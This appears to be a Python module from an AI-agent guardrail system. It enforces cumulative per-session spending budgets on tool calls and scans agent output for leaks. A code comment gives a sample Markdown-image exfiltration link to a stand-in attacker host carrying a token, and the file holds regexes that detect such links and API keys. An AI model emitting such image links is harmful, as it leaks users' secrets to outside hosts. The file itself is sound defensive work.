"""
ContractGuard-X Module 4: Stateful Effect-Safe Execution & Atomic Ledger
Enforces canonical effect budgets across multi-turn sessions and inspects output egress.
"""
from __future__ import annotations
import re
import time
import uuid
import threading
from enum import Enum
from typing import Dict, List, Any, Optional, Tuple
from pydantic import BaseModel, Field

class CanonicalEffectType(str, Enum):
    FUNDS_TRANSFER = "funds_transfer"
    EXTERNAL_DATA_EGRESS = "external_data_egress"
    FILE_MODIFICATION = "file_modification"
    SYSTEM_EXEC = "system_exec"
    READ_DATA = "read_data"

class ReservationStatus(str, Enum):
    PENDING = "PENDING"
    COMMITTED = "COMMITTED"
    REVERTED = "REVERTED"

class EffectReservation(BaseModel):
    reservation_id: str
    idempotency_key: str
    session_id: str
    tool_name: str
    canonical_type: CanonicalEffectType
    delta_amount: float = 0.0
    status: ReservationStatus = ReservationStatus.PENDING
    timestamp: float = Field(default_factory=time.time)
    metadata: Dict[str, Any] = Field(default_factory=dict)

class OutputInspectionResult(BaseModel):
    safe: bool
    modified_text: str
    violation_detected: Optional[str] = None
    redaction_count: int = 0

class StatefulEffectLedger:
    """
    Maintains session-level cumulative effect state with atomic reservation locking
    to stop multi-turn salami-slicing attacks and cumulative budget drains.
    """

    def __init__(self):
        self._lock = threading.Lock()
        self._reservations: Dict[str, EffectReservation] = {}
        self._session_budgets: Dict[str, float] = {}

    def get_session_spent(self, session_id: str) -> float:
        """Returns total committed + pending spend for a session."""
        with self._lock:
            total = 0.0
            for r in self._reservations.values():
                if r.session_id == session_id and r.status in [ReservationStatus.PENDING, ReservationStatus.COMMITTED]:
                    total += r.delta_amount
            return total

    def extract_delta(self, tool_name: str, parameters: Dict[str, Any]) -> Tuple[CanonicalEffectType, float]:
        """Maps proposed tool call into a canonical effect type and financial delta."""
        # Financial tools
        if any(term in tool_name.lower() for term in ["refund", "transfer", "pay", "spend", "withdraw"]):
            for key in ["amount", "value", "cost", "sum", "payment"]:
                if key in parameters:
                    try:
                        return CanonicalEffectType.FUNDS_TRANSFER, float(parameters[key])
                    except (ValueError, TypeError):
                        pass
            return CanonicalEffectType.FUNDS_TRANSFER, 0.0

        # Data egress tools
        if any(term in tool_name.lower() for term in ["email", "upload", "webhook", "post", "send"]):
            return CanonicalEffectType.EXTERNAL_DATA_EGRESS, 0.0

        # System execution
        if any(term in tool_name.lower() for term in ["shell", "exec", "database", "format", "delete"]):
            return CanonicalEffectType.SYSTEM_EXEC, 0.0

        return CanonicalEffectType.READ_DATA, 0.0

    def reserve_atomic(
        self,
        session_id: str,
        tool_name: str,
        parameters: Dict[str, Any],
        max_budget: float = 1000.0
    ) -> Tuple[bool, Optional[EffectReservation], str]:
        """
        Atomically checks if proposed action complies with cumulative session budget.
        If valid, reserves budget and returns unique idempotency key.
        """
        canonical_type, delta = self.extract_delta(tool_name, parameters)

        with self._lock:
            current_spent = 0.0
            for r in self._reservations.values():
                if r.session_id == session_id and r.status in [ReservationStatus.PENDING, ReservationStatus.COMMITTED]:
                    current_spent += r.delta_amount

            proposed_total = current_spent + delta

            # Enforce cumulative ceiling
            if max_budget is not None and delta > 0 and proposed_total > max_budget:
                return False, None, (
                    f"Cumulative budget limit exceeded! "
                    f"Already committed/pending: ${current_spent:.2f}, Proposed delta: ${delta:.2f}, "
                    f"Resulting total: ${proposed_total:.2f} > Policy ceiling: ${max_budget:.2f}."
                )

            # Issue atomic reservation
            res_id = f"res_{uuid.uuid4().hex[:12]}"
            idempotency_key = f"cgx_idem_{uuid.uuid4().hex[:16]}"
            reservation = EffectReservation(
                reservation_id=res_id,
                idempotency_key=idempotency_key,
                session_id=session_id,
                tool_name=tool_name,
                canonical_type=canonical_type,
                delta_amount=delta,
                status=ReservationStatus.COMMITTED  # Auto-commit for sync calls
            )
            self._reservations[res_id] = reservation
            return True, reservation, f"Atomic reservation approved. New cumulative total: ${proposed_total:.2f}/${max_budget:.2f}."

    def reset_session(self, session_id: str) -> None:
        with self._lock:
            keys_to_del = [k for k, v in self._reservations.items() if v.session_id == session_id]
            for k in keys_to_del:
                del self._reservations[k]

class OutputGuard:
    """
    Inspects outgoing responses to prevent Markdown image exfiltration and confidential token egress.
    """

    MARKDOWN_IMAGE_PATTERN = re.compile(r"!\[(.*?)\]\((https?://[^\s\)]+)\)", re.IGNORECASE)
    SECRET_KEY_PATTERN = re.compile(r"(SEC_[A-Za-z0-9_]{8,}|sk-[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{20,})", re.IGNORECASE)

    @classmethod
    def inspect(cls, response_text: str) -> OutputInspectionResult:
        if not response_text:
            return OutputInspectionResult(safe=True, modified_text="")

        modified = response_text
        violation = None
        redaction_count = 0

        # Check for Markdown image exfiltration (e.g. ![leak](https://attacker.site/track?token=...))
        image_matches = cls.MARKDOWN_IMAGE_PATTERN.findall(modified)
        if image_matches:
            violation = "Unauthorized Markdown Image Exfiltration Attempt"
            # Neutralize image tag
            modified = cls.MARKDOWN_IMAGE_PATTERN.sub(r"[BLOCKED_IMAGE_EXFILTRATION: \1]", modified)
            redaction_count += len(image_matches)

        # Check for raw API keys or secrets
        secret_matches = cls.SECRET_KEY_PATTERN.findall(modified)
        if secret_matches:
            violation = violation or "Confidential Token / API Key Leakage"
            modified = cls.SECRET_KEY_PATTERN.sub(r"[REDACTED_API_KEY]", modified)
            redaction_count += len(secret_matches)

        return OutputInspectionResult(
            safe=(violation is None),
            modified_text=modified,
            violation_detected=violation,
            redaction_count=redaction_count
        )

stateful_ledger = StatefulEffectLedger()
output_guard = OutputGuard()
